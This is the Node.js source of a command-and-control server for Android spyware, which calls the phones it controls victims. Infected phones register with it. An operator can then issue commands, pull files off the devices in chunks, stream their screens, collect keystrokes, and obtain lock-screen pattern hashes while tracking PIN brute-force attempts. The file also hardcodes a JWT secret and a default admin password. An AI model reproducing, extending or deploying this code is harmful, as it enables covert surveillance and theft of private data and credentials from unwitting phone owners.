const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const sqlite3 = require('sqlite3').verbose();
const bcrypt = require('bcrypt');
const jwt = require('jsonwebtoken');
const cors = require('cors');
const compression = require('compression');
const helmet = require('helmet');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
    cors: { origin: "*" },
    transports: ['polling', 'websocket'],
    maxHttpBufferSize: 1e8 // 100MB for file transfers
});

// Middleware
app.use(helmet({
    contentSecurityPolicy: false,
}));
app.use(compression());
app.use(cors());
app.use(express.json({ limit: '100mb' }));
app.use(express.static('public'));

// Database setup
const db = new sqlite3.Database('c2h_panel.db');

// Create tables
db.serialize(() => {
    // Users table
    db.run(`CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE,
        password TEXT,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);
    
    // Devices table
    db.run(`CREATE TABLE IF NOT EXISTS devices (
        device_id TEXT PRIMARY KEY,
        device_name TEXT,
        battery INTEGER,
        android_version TEXT,
        root_status INTEGER,
        last_seen DATETIME,
        first_seen DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);
    
    // Commands history
    db.run(`CREATE TABLE IF NOT EXISTS commands (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id TEXT,
        command_type TEXT,
        command_data TEXT,
        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);
    
    // Captured data
    db.run(`CREATE TABLE IF NOT EXISTS captured_data (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id TEXT,
        data_type TEXT,
        data_content TEXT,
        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);
    
    // Create default admin user
    bcrypt.hash('admin123', 10, (err, hash) => {
        if (!err) {
            db.run(`INSERT OR IGNORE INTO users (username, password) VALUES (?, ?)`, ['admin', hash]);
        }
    });
});

// Store active sockets
const devices = new Map();
const deviceInfo = new Map();
const pendingDownloads = new Map();

// ============ SOCKET.IO EVENTS ============
io.on('connection', (socket) => {
    console.log('✅ Client connected:', socket.id);
    
    // Authenticate panel
    socket.on('panel_auth', (token) => {
        try {
            const decoded = jwt.verify(token, 'c2h_secret_key_2024');
            socket.isAuthenticated = true;
            socket.username = decoded.username;
            socket.emit('auth_success', { message: 'Authenticated!' });
            console.log('🔐 Panel authenticated:', decoded.username);
        } catch(err) {
            socket.emit('auth_error', { message: 'Invalid token' });
        }
    });
    
    // APK/Victim registers
    socket.on('victim_connect', async (data) => {
        console.log('📱 Device connected:', data.deviceId);
        
        devices.set(data.deviceId, socket.id);
        deviceInfo.set(data.deviceId, {
            deviceId: data.deviceId,
            deviceName: data.deviceName || 'Unknown Device',
            battery: data.battery || 100,
            androidVersion: data.androidVersion,
            rootStatus: data.rootStatus || 0,
            lastSeen: new Date()
        });
        
        // Save to database
        db.run(`INSERT OR REPLACE INTO devices (device_id, device_name, battery, android_version, root_status, last_seen) 
                VALUES (?, ?, ?, ?, ?, ?)`,
            [data.deviceId, data.deviceName, data.battery, data.androidVersion, data.rootStatus, new Date()]);
        
        broadcastDevices();
        
        // Send pending commands if any
        if (pendingDownloads.has(data.deviceId)) {
            socket.emit('pending_downloads', pendingDownloads.get(data.deviceId));
        }
    });
    
    // Handle panel commands
    socket.on('panel_command', (data) => {
        const targetSocket = devices.get(data.targetId);
        if (targetSocket) {
            // Log command
            db.run(`INSERT INTO commands (device_id, command_type, command_data) VALUES (?, ?, ?)`,
                [data.targetId, data.type, JSON.stringify(data.data)]);
            
            io.to(targetSocket).emit(data.type, data.data);
            console.log(`📡 Command sent to ${data.targetId}: ${data.type}`);
        } else {
            socket.emit('error', { message: 'Device offline' });
        }
    });
    
    // ============ LOCK SCREEN BYPASS HANDLERS ============
    
    // Get pattern hash
    socket.on('get_pattern_hash', (data) => {
        const targetSocket = devices.get(data.deviceId);
        if (targetSocket) {
            io.to(targetSocket).emit('request_pattern_hash', {});
        }
    });
    
    // Receive pattern hash
    socket.on('pattern_hash_response', (data) => {
        socket.broadcast.emit('pattern_hash_received', {
            deviceId: data.deviceId,
            hash: data.hash,
            pattern: data.crackedPattern || null
        });
        
        // Save to database
        db.run(`INSERT INTO captured_data (device_id, data_type, data_content) VALUES (?, ?, ?)`,
            [data.deviceId, 'pattern_hash', data.hash]);
    });
    
    // PIN brute force status
    socket.on('pin_brute_status', (data) => {
        socket.broadcast.emit('pin_brute_update', data);
    });
    
    // Fingerprint status
    socket.on('fingerprint_status', (data) => {
        socket.broadcast.emit('fingerprint_update', data);
    });
    
    // ============ FILE TRANSFER ============
    
    socket.on('request_file_list', (data) => {
        const targetSocket = devices.get(data.deviceId);
        if (targetSocket) {
            io.to(targetSocket).emit('list_files', { path: data.path || '/' });
        }
    });
    
    socket.on('file_list_response', (data) => {
        socket.broadcast.emit('file_list_received', data);
    });
    
    socket.on('request_download_file', (data) => {
        const targetSocket = devices.get(data.deviceId);
        if (targetSocket) {
            pendingDownloads.set(data.deviceId, data);
            io.to(targetSocket).emit('download_file', {
                path: data.path,
                chunkSize: 1024 * 1024 // 1MB chunks
            });
        }
    });
    
    socket.on('file_chunk', (data) => {
        // Save file chunks
        const filePath = path.join(__dirname, 'downloads', `${data.deviceId}_${Date.now()}_${data.filename}`);
        fs.appendFileSync(filePath, Buffer.from(data.chunk));
        
        if (data.last) {
            socket.broadcast.emit('download_complete', {
                deviceId: data.deviceId,
                filename: data.filename,
                path: filePath
            });
            pendingDownloads.delete(data.deviceId);
        }
    });
    
    // ============ SCREEN STREAM ============
    
    socket.on('live_screen', (data) => {
        socket.broadcast.emit('live_screen_update', data);
    });
    
    // ============ SYSTEM INFO ============
    
    socket.on('system_info', (data) => {
        db.run(`INSERT INTO captured_data (device_id, data_type, data_content) VALUES (?, ?, ?)`,
            [data.deviceId, 'system_info', JSON.stringify(data.info)]);
        socket.broadcast.emit('system_info_received', data);
    });
    
    // ============ KEYLOGGER ============
    
    socket.on('keystroke', (data) => {
        db.run(`INSERT INTO captured_data (device_id, data_type, data_content) VALUES (?, ?, ?)`,
            [data.deviceId, 'keystroke', JSON.stringify(data)]);
        socket.broadcast.emit('keystroke_received', data);
    });
    
    // ============ HEARTBEAT ============
    
    socket.on('heartbeat', (data) => {
        if (deviceInfo.has(data.deviceId)) {
            deviceInfo.get(data.deviceId).battery = data.battery;
            deviceInfo.get(data.deviceId).lastSeen = new Date();
            
            db.run(`UPDATE devices SET battery = ?, last_seen = ? WHERE device_id = ?`,
                [data.battery, new Date(), data.deviceId]);
            
            broadcastDevices();
        }
    });
    
    // ============ DISCONNECT ============
    
    socket.on('disconnect', () => {
        for (let [id, sockId] of devices.entries()) {
            if (sockId === socket.id) {
                devices.delete(id);
                deviceInfo.delete(id);
                broadcastDevices();
                console.log(`📱 Device disconnected: ${id}`);
                break;
            }
        }
    });
});

// Broadcast devices list to all panels
function broadcastDevices() {
    const list = Array.from(deviceInfo.values());
    io.emit('devices_list', list);
}

// ============ REST API ENDPOINTS ============

// Authentication
app.post('/api/login', async (req, res) => {
    const { username, password } = req.body;
    
    db.get('SELECT * FROM users WHERE username = ?', [username], async (err, user) => {
        if (err || !user) {
            return res.status(401).json({ error: 'Invalid credentials' });
        }
        
        const valid = await bcrypt.compare(password, user.password);
        if (!valid) {
            return res.status(401).json({ error: 'Invalid credentials' });
        }
        
        const token = jwt.sign({ username: user.username, userId: user.id }, 'c2h_secret_key_2024', { expiresIn: '24h' });
        res.json({ token, username: user.username });
    });
});

// Get all devices
app.get('/api/devices', (req, res) => {
    const list = Array.from(deviceInfo.values());
    res.json(list);
});

// Get captured data
app.get('/api/captured/:deviceId', (req, res) => {
    const { deviceId } = req.params;
    const { type, limit = 100 } = req.query;
    
    let query = 'SELECT * FROM captured_data WHERE device_id = ?';
    const params = [deviceId];
    
    if (type) {
        query += ' AND data_type = ?';
        params.push(type);
    }
    
    query += ' ORDER BY timestamp DESC LIMIT ?';
    params.push(limit);
    
    db.all(query, params, (err, rows) => {
        if (err) {
            res.status(500).json({ error: err.message });
        } else {
            res.json(rows);
        }
    });
});

// Send command via API
app.post('/api/command', (req, res) => {
    const { deviceId, command, data } = req.body;
    const targetSocket = devices.get(deviceId);
    
    if (targetSocket) {
        io.to(targetSocket).emit(command, data);
        res.json({ success: true, message: 'Command sent' });
    } else {
        res.status(404).json({ error: 'Device offline' });
    }
});

// Get command history
app.get('/api/commands/:deviceId', (req, res) => {
    const { deviceId } = req.params;
    const { limit = 50 } = req.query;
    
    db.all('SELECT * FROM commands WHERE device_id = ? ORDER BY timestamp DESC LIMIT ?',
        [deviceId, limit], (err, rows) => {
            if (err) {
                res.status(500).json({ error: err.message });
            } else {
                res.json(rows);
            }
        });
});

// Create downloads directory
if (!fs.existsSync('./downloads')) {
    fs.mkdirSync('./downloads');
}
if (!fs.existsSync('./public')) {
    fs.mkdirSync('./public');
}

// Serve panel
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'panel.html'));
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`🚀 Ultimate C2H Panel running on http://localhost:${PORT}`);
    console.log(`📱 Default login: admin / admin123`);
    console.log(`🔒 Lock screen bypass tools enabled`);
});
